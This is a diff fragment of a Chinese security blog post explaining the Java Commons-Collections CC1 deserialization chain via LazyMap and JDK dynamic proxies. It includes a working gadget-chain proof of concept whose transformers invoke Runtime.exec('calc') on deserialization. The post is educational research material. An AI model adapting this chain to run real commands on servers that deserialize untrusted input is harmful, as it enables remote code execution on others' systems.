+<p>//自定义InvocationHandler的实现类，它的作用是：<strong>拦截对代理对象方法的调用，并在真实方法执行前后插入额外逻辑（比如日志、权限控制、事务等）</strong>。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">cn.itcast.demo.Proxy</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.InvocationHandler</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Method</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">TestInvocationHandler</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">InvocationHandler</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">target</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">TestInvocationHandler</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">target</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">target</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">target</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">invoke</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">proxy</span><span class="p">,</span><span class="w"> </span><span class="n">Method</span><span class="w"> </span><span class="n">method</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Throwable</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">method</span><span class="p">.</span><span class="na">getName</span><span class="p">().</span><span class="na">equals</span><span class="p">(</span><span class="s">&#34;sing&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;经纪人开始准备唱歌工作&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">method</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">target</span><span class="p">,</span><span class="w"> </span><span class="n">args</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;唱歌工作完成开始收尾工作&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">method</span><span class="p">.</span><span class="na">getName</span><span class="p">().</span><span class="na">equals</span><span class="p">(</span><span class="s">&#34;dance&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;经纪人开始准备跳舞工作&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">method</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">target</span><span class="p">,</span><span class="w"> </span><span class="n">args</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;跳舞工作完成开始收尾工作&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">proxy</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>//</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">cn.itcast.demo.Proxy</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Proxy</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">TestProxy</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//new UserServiceImpl() 具体要代理的对象，也就是明星</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TestInvocationHandler</span><span class="w"> </span><span class="n">testInvocationHandler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TestInvocationHandler</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">UserServiceImpl</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">UserService</span><span class="w"> </span><span class="n">us</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">UserService</span><span class="p">)</span><span class="w"> </span><span class="n">Proxy</span><span class="p">.</span><span class="na">newProxyInstance</span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">//// 1. 类加载器</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">ClassLoader</span><span class="p">.</span><span class="na">getSystemClassLoader</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// 2. 代理要实现的接口列表</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">UserService</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// 3. 方法调用处理器</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">testInvocationHandler</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">us</span><span class="p">.</span><span class="na">sing</span><span class="p">(</span><span class="s">&#34;蔡徐坤&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1cc1%E9%93%BE-lazymap/image/7.png"
+	width="2317"
+	height="1079"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1cc1%E9%93%BE-lazymap/image/7_hu_3bfc9b339ab51a1e.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1cc1%E9%93%BE-lazymap/image/7_hu_2637f195cd0af0ec.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="214"
+		data-flex-basis="515px"
+	
+></p>
+<p>//整体执行流程</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">调用</span><span class="w"> </span><span class="n">us</span><span class="p">.</span><span class="na">sing</span><span class="p">(</span><span class="s">&#34;蔡徐坤&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="err">↓</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">JVM</span><span class="w"> </span><span class="n">发现</span><span class="w"> </span><span class="n">us</span><span class="w"> </span><span class="n">是代理对象</span><span class="err">（</span><span class="n">$Proxy0</span><span class="err">）</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="err">↓</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">自动调用</span><span class="w"> </span><span class="n">testInvocationHandler</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">proxy</span><span class="p">,</span><span class="w"> </span><span class="n">method</span><span class="p">,</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="err">↓</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">你在</span><span class="w"> </span><span class="n">TestInvocationHandler</span><span class="p">.</span><span class="na">invoke</span><span class="p">()</span><span class="w"> </span><span class="n">中编写逻辑</span><span class="err">：</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="o">-</span><span class="w"> </span><span class="n">可以打印</span><span class="w"> </span><span class="s">&#34;【前置】准备唱歌...&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="o">-</span><span class="w"> </span><span class="n">调用</span><span class="w"> </span><span class="n">method</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">realObject</span><span class="p">,</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="n">执行</span><span class="w"> </span><span class="n">UserServiceImpl</span><span class="p">.</span><span class="na">sing</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="o">-</span><span class="w"> </span><span class="n">打印</span><span class="w"> </span><span class="s">&#34;【后置】唱完了！&#34;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="4最终流程">4.最终流程
+</h3><p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1cc1%E9%93%BE-lazymap/image/8.png"
+	width="2117"
+	height="1295"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1cc1%E9%93%BE-lazymap/image/8_hu_73a4d0e4aa68c862.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1cc1%E9%93%BE-lazymap/image/8_hu_21c69d7b1d88e985.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="163"
+		data-flex-basis="392px"
+	
+></p>
+<p>当反序列化时，默认执行readObject方法，走到memberValues.entrySet()方法时，由于此时memberValue是我们传入的lazyMap，lazyMap是JDK的动态代理对象，代理MAP这个接口，那么任何对Map接口方法的调用都会走到invoke方法中， 自动触发 <code>handler.invoke(proxy, method[entrySet], args)</code>最终走到get方法</p>
+<p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1cc1%E9%93%BE-lazymap/image/9.png"
+	width="2419"
+	height="1287"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1cc1%E9%93%BE-lazymap/image/9_hu_c3ab130171c4d2fa.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1cc1%E9%93%BE-lazymap/image/9_hu_1bd8b9993b4dfb72.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="187"
+		data-flex-basis="451px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">cc1_lazyMap</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="o">[]</span><span class="w"> </span><span class="n">transformers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">}),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">}),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">})</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ChainedTransformer</span><span class="w"> </span><span class="n">chainedTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="n">transformers</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 使用 LazyMap（更稳定）</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">map</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;value&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;123456&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">lazyMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LazyMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">map</span><span class="p">,</span><span class="w"> </span><span class="n">chainedTransformer</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 创建 AnnotationInvocationHandler</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="w"> </span><span class="n">ctor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ctor</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvocationHandler</span><span class="w"> </span><span class="n">handler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">InvocationHandler</span><span class="p">)</span><span class="w"> </span><span class="n">ctor</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">Target</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">lazyMap</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">proxymap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Map</span><span class="p">)</span><span class="w"> </span><span class="n">Proxy</span><span class="p">.</span><span class="na">newProxyInstance</span><span class="p">(</span><span class="n">ClassLoader</span><span class="p">.</span><span class="na">getSystemClassLoader</span><span class="p">(),</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="n">handler</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ctor</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">Target</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">proxymap</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 序列化代理对象（不是 handler 本身！）</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">serialize</span><span class="p">(</span><span class="n">o</span><span class="p">);</span><span class="w">  </span><span class="c1">// 注意：序列化的是 proxy</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">deserialize</span><span class="p">(</span><span class="s">&#34;test.ser&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1cc1%E9%93%BE-lazymap/image/10.png"
+	width="2055"
+	height="1077"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1cc1%E9%93%BE-lazymap/image/10_hu_572d096dfabd705d.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1cc1%E9%93%BE-lazymap/image/10_hu_ced50d73400e5a17.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="190"
+		data-flex-basis="457px"
+	
+></p>
+<h3 id="5为什么-ysoserial-使用-lazymap-而非-transformedmap">5.为什么 ysoserial 使用 LazyMap 而非 TransformedMap？
+</h3><ul>
+<li><code>AnnotationInvocationHandler</code> 实际是注解的动态代理。</li>
+<li>当反序列化后，若有人调用注解方法（如 <code>@Target.value()</code>），会触发 <code>LazyMap.get(&quot;value&quot;)</code></li>
+<li>而 <code>TransformedMap</code> 依赖 <code>setValue()</code>，仅在部分 JDK 版本中被调用，不稳定。</li>
+<li>因此 LazyMap + 动态代理 是更通用的触发方式。</li>
+</ul>
+<p><a class="link" href="https://drun1baby.top/2022/06/10/Java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96Commons-Collections%e7%af%8702-CC1%e9%93%be%e8%a1%a5%e5%85%85/"  target="_blank" rel="noopener"
+    >https://drun1baby.top/2022/06/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8702-CC1%E9%93%BE%E8%A1%A5%E5%85%85/</a></p>
+
 </section>
 
 
@@ -337,7 +972,7 @@
 
 
         <span>
-            最后更新于 Dec 09, 2025 17:45 &#43;0800
+            最后更新于 Dec 11, 2025 15:31 &#43;0800
         </span>
     </section></footer>
 
@@ -348,6 +983,124 @@
     
 
     
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96cc1%E9%93%BE---transformedmap/">
+        
+        
+            <div class="article-image">
+                <img src="/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96cc1%E9%93%BE---transformedmap/logo.6e6f809cb10d34e6dee209f93cdc73a4_hu_420b333cf7175d46.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Java反序列化CC1链---TransformedMap"
+                        
+                        data-hash="md5-bm&#43;AnLENNObe4gn5PNxzpA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Java反序列化CC1链---TransformedMap</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/urldns%E9%93%BE%E7%AE%80%E4%BB%8B%E4%B8%8Eshiro%E6%9C%89key%E6%97%A0%E9%93%BE%E5%88%A9%E7%94%A8/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">URLDNS链简介与Shiro有key无链利用</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/app%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/">
+        
+        
+            <div class="article-image">
+                <img src="/p/app%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/logo.3508d8f9d8136996316158a1af27e70a_hu_5c4a9f8e39978018.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post APP客户端渗透测试之通信安全"
+                        
+                        data-hash="md5-NQjY&#43;dgTaZYxYVihryfnCg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">APP客户端渗透测试之通信安全</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/app%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%B9%8B%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E9%98%B2%E6%8A%A4/">
+        
+        
+            <div class="article-image">
+                <img src="/p/app%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%B9%8B%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E9%98%B2%E6%8A%A4/logo.3508d8f9d8136996316158a1af27e70a_hu_5c4a9f8e39978018.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post APP客户端之逆向工程防护"
+                        
+                        data-hash="md5-NQjY&#43;dgTaZYxYVihryfnCg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">APP客户端之逆向工程防护</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/app%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%B9%8Bbrida/">
+        
+        
+            <div class="article-image">
+                <img src="/p/app%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%B9%8Bbrida/logo.3508d8f9d8136996316158a1af27e70a_hu_5c4a9f8e39978018.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post APP加解密之Brida"
+                        
